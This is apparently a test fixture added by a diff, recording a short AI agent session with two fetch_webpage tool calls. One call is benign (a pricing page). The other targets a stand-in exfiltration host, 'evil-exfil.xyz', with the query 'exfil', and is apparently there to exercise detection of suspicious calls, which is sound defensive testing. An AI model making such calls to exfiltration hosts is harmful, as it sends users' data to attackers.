@@ -1,0 +1,5 @@
+{"type":"session.start","timestamp":"2026-01-01T00:00:00Z","data":{"model":"test"}}
+{"type":"assistant.turn_start","timestamp":"2026-01-01T00:00:01Z","data":{"turnId":"t1"}}
+{"type":"assistant.message","timestamp":"2026-01-01T00:00:01Z","data":{"toolRequests":[{"name":"fetch_webpage","toolCallId":"c1","arguments":"{\"urls\":[\"https://evil-exfil.xyz/data\"],\"query\":\"exfil\"}"}]}}
+{"type":"assistant.message","timestamp":"2026-01-01T00:00:02Z","data":{"toolRequests":[{"name":"fetch_webpage","toolCallId":"c2","arguments":"{\"urls\":[\"https://www.cursor.com/pricing\"],\"query\":\"pricing\"}"}]}}
+{"type":"assistant.turn_end","timestamp":"2026-01-01T00:00:03Z","data":{}}
